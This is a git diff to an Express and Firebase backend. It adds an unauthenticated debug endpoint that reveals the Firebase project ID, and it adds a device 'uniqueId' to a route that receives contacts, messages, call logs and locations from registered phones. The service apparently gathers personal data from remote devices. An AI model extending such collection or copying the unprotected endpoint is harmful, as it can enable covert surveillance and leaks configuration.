@@ -160,6 +160,23 @@ app.get("/health", (req, res) => {
   });
 });
 
+// Debug: confirm which Firebase project this backend is writing to
+app.get("/api/debug/firebase", (req, res) => {
+  try {
+    const appInstance = admin.app();
+    res.json({
+      projectId: appInstance.options.projectId || null,
+      serviceAccount: {
+        // credential is not exposed, so we rely on startup logs for email;
+        // this endpoint is for quick projectId verification only.
+        available: true,
+      },
+    });
+  } catch (e: any) {
+    res.status(500).json({ error: e?.message || "debug_failed" });
+  }
+});
+
 // --- API Routes ---
 
 // Register Device
@@ -225,7 +242,7 @@ app.post("/api/register-device", async (req, res) => {
 // Upload Data (contacts, messages, call logs, apps, stats, locations)
 app.post("/api/upload/:deviceId", async (req, res) => {
   const { deviceId } = req.params;
-  const { type, data } = req.body;
+  const { type, data, uniqueId } = req.body;
 
   if (!deviceId || !type || !data) {
     return res
@@ -243,6 +260,7 @@ app.post("/api/upload/:deviceId", async (req, res) => {
         lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
         status: "active",
         isOnline: true,
+        ...(uniqueId ? { uniqueId } : {}),
       },
       { merge: true },
     );
